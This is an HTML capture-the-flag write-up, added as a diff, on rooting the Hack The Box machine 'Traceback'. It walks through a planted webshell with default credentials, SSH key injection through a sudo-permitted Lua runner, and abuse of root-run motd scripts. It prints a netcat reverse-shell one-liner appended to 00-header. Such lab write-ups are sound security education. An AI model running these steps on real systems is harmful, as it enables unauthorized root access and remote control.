@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <style>
+      hr {
+        background-color: #D2D4D5;
+        height: 2px;
+        border: 0px;
+      }
+      .container{
+        margin-left:120px;
+        margin-right:120px;
+      }
+      div{
+        font-family: Bahnschrift condensed;
+        font-size:20px;
+      }
+      mark{
+        background-color: #F3CED7;
+        color: #F65B81;
+      }
+    </style>
+    <title>HTB Traceback Writeup</title>
+  </head>
+  <body class="container">
+    <header>
+      <h1 style="color: #384B60"><center>Hack The Box Writeup: Traceback</center></h1>
+      <center><div style="color: #384B60">3/29/2020</div></center>
+      <hr/>
+    </header>
+    <article style="margin-top:60px">
+      <div style="font-size: 25px">Introduction:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <img src="pictures/traceback/profile.png" alt="Traceback" style="width:42%">
+      <div>Traceback is a easy linux machine on Hack The Box that involves a little <mark>OSINT</mark> and <mark>lua</mark> scripting to get User, and some process analysis to get Root.</div>
+      <div>Its ip is <mark>10.10.10.181</mark> and I will add it to <mark>/etc/hosts</mark> as <mark>traceback.htb</mark>.</div>
+      <br/>
+      <div style="font-size: 25px">Nmap:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div>Let's start with a <mark>nmap</mark> scan on our target:</div>
+      <br/>
+      <img src="pictures/traceback/nmap_result.png" alt="Nmap" style="width:78%">
+      <div>Analysing our <mark>nmap</mark> result, we got <mark>ssh</mark> on port 22 and <mark>http</mark> on port 80.</div>
+      <div>Judging from the difficulty rating of this box, we are probably going to find some sort of credentials from port 80 that we can use to <mark>SSH</mark> into the box.</div>
+      <div>Let's start our web enumeration.</div>
+      <br/>
+      <div style="font-size: 25px">Web Enumeration:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div>Going to <mark>http://traceback.htb</mark>, we see a rather unique page:</div>
+      <br/>
+      <img src="pictures/traceback/webpage.png" alt="webpage" style="width:58%">
+      <div>I looked at the page source and found something interesting: </div>
+      <br/>
+      <img src="pictures/traceback/source.png" alt="source code" style="width:78%">
+      <div>There is a comment that says "some of the best web shells that you might need".</div>
+      <div>This comment is probably a hint by the maker of this box <mark>Xh4H</mark>, so let's bring it to <mark>Google</mark>.</div>
+      <br/>
+      <div>After some searching, we found <mark>Xh4H</mark>'s <mark>github</mark> page that contained a list of web shells:</div>
+      <br/>
+      <img src="pictures/traceback/github.png" alt="github" style="width:80%">
+      <div>I don't really have any idea on what to do next, so I just manually tried all the names of the webshells.</div>
+      <br/>
+      <div>Fortunately, I managed to find the webshell that <mark>Xh4H</mark> had left.</div>
+      <div>The webshell is <mark>smevk.php</mark>.</div>
+      <div>Navigating to <mark>http://traceback.htb/smevk.php</mark>, we are greeted by this login page:</div>
+      <br/>
+      <img src="pictures/traceback/smevk.png" alt="smevk" style="width:48%">
+      <div>Analysing <mark>smevk.php</mark>, we can see that the default credentials are <mark>admin:admin</mark>.</div>
+      <br/>
+      <img src="pictures/traceback/webshell_creds.png" alt="webshell creds" style="width:78%">
+      <div>I tried to login with the credentials and succeeded.</div>
+      <div>We are now in the webshell.</div>
+      <br/>
+      <div style="font-size: 25px">Getting User:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div><mark>SmEvK Webshell</mark>:</div>
+      <br/>
+      <img src="pictures/traceback/shell.png" alt="shell" style="width:100%">
+      <div>After some enumeration, I found two users on this machine: <mark>webadmin</mark> and <mark>sysadmin</mark>.</div>
+      <div>We are currently <mark>webadmin</mark> on the webshell.</div>
+      <div>Unfortunately, we have to become <mark>sysadmin</mark> to be able to read <mark>user.txt</mark>, so let's try to do that.</div>
+      <br/>
+      <div>Let's check our sudo priviledges with the command <mark>sudo -l</mark>:</div>
+      <br/>
+      <img src="pictures/traceback/sudo.png" alt="sudo" style="width:86%">
+      <div>We see that the user <mark>webadmin</mark> is able to run <mark>luvit</mark> as <mark>sysadmin</mark>.</div>
+      <div>Fun Fact: <mark>luvit</mark> was initially in the <mark>webadmin</mark> directory, but got moved to <mark>/home/sysadmin</mark> because people kept deleting it.</div>
+      <br/>
+      <div><mark>luvit</mark>:</div>
+      <img src="pictures/traceback/luvit.png" alt="luvit" style="width:66%">
+      <div><mark>Google</mark> tells us that <mark>luvit</mark> is used to run <mark>lua</mark> scripts.</div>
+      <div>Since we are able to run luvit as <mark>sysadmin</mark>, it means that we can run malicious <mark>lua</mark> scripts as <mark>sysadmin</mark> and potentially get a shell as <mark>sysadmin</mark>.</div>
+      <div>Let's figure out how to do that.</div>
+      <br/>
+      <div><mark>script.lua</mark>:</div>
+      <img src="pictures/traceback/privesc.png" alt="privesc" style="width:66%">
+      <div>After looking at some files in the <mark>webadmin</mark> directory, I realised that we can write to the file <mark>/home/sysadmin/.ssh/authorized_keys</mark>.</div>
+      <div>I generated my <mark>SSH</mark> keys with <mark>ssh-keygen</mark> and added it to <mark>/home/sysadmin/.ssh/authorized_keys</mark> with <mark>test.lua</mark>.</div>
+      <div>Let's execute this script with the command <mark>sudo -u sysadmin /home/sysadmin/luvit test.lua</mark>.</div>
+      <div>Now we can <mark>SSH</mark> in as <mark>sysadmin</mark>!</div>
+      <br/>
+      <div style="font-size: 25px">Getting Root:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div><mark>SSH</mark>:</div>
+      <img src="pictures/traceback/we_are_sysadmin.png" alt="sysadmin" style="width:80%">
+      <div>Our script worked. We are now <mark>sysadmin</mark> and can read <mark>user.txt</mark>.</div>
+      <br/>
+      <div>Basic enumeration did not give me desired results, and I was stuck here for a while.</div>
+      <div>As I browsed through the forum for hints, I found out that there exists a tool called <mark>pspy</mark> that can be used to monitor active linux processes.</div>
+      <div>I cloned the tool and ran it the target machine.</div>
+      <br/>
+      <div><mark>pspy results</mark>:</div>
+      <img src="pictures/traceback/pspy.png" alt="pspy" style="width:86%">
+      <div>Here we can see that <mark>root</mark>(UID=0) is constantly resetting the contents of the files in <mark>/etc/update-motd.d</mark> back to their original state.</div>
+      <div>Out of curiosity, I went to look at the contents of <mark>/etc/update-motd.d</mark>.</div>
+      <div><mark>/etc/update-motd.d</mark>:</div>
+      <img src="pictures/traceback/update-motd.png" alt="directory" style="width:66%">
+      <br/>
+      <div>Let's go ahead and check the <mark>00-header</mark> file.</div>
+      <div><mark>00-header</mark>:</div>
+      <img src="pictures/traceback/00-header.png" alt="file" style="width:66%">
+      <div>We can see that the file is able to execute the <mark>echo</mark> command  as <mark>root</mark> and print out 'Welcome to Xh4H land.'</div>
+      <div>Seems familiar?</div>
+      <div>This message is exactly what we saw when we <mark>SSH</mark>ed in as <mark>sysadmin</mark>.</div>
+      <div>We can therefore deduce that this file will be executed everytime a user <mark>SSH</mark> into the machine.</div>
+      <div>Now we just have to write a malicious command to the file and log in via <mark>SSH</mark> again for it to be executed.</div>
+      <br/>
+      <div><mark>command</mark>:</div>
+      <img src="pictures/traceback/rooting.png" alt="command" style="width:86%">
+      <div>I set up a <mark>netcat</mark> listener and wrote this command for a reverse shell: <mark>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc #yourIP #yourPORT >/tmp/f' >> 00-header</mark>.</div>
+      <br/>
+      <div>This time, <mark>SSH</mark> did not give us a shell, but when we check our listener...</div>
+      <img src="pictures/traceback/rooted.png" alt="rooted" style="width:66%">
+      <div>WE ARE ROOT!</div>
+      <br/>
+      <div style="font-size: 25px">Adding on:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div>For more fun, I wrote a python script that will give me root with a click.</div>
+      <br/>
+      <div><mark>script results</mark>:</div>
+      <img src="pictures/traceback/script.png" alt="script" style="width:86%">
+      <div>xD</div>
+      <div style="font-size: 25px">Conclusion:</div>
+      <hr align="left" width="180px">
+      <div><mark>Traceback</mark> is a fairly simple yet fun and unique box. I enjoyed the part where I had to <mark>SSH</mark> into the machine to trigger the payload before it got reset.</div>
+      <div>I learnt about <mark>lua</mark> scripting and the use of <mark>pspy</mark> to monitor active processes on linux.</div>
+      <div>That's all I have for <mark>Traceback</mark>, and I hope to see you the next time.</div>
+      <br/>
+      <div><center>Thank you for reading!</center></div>
+      <div><center>~chiefpie</center></div>
+    </article>
+  </body>
+</html>
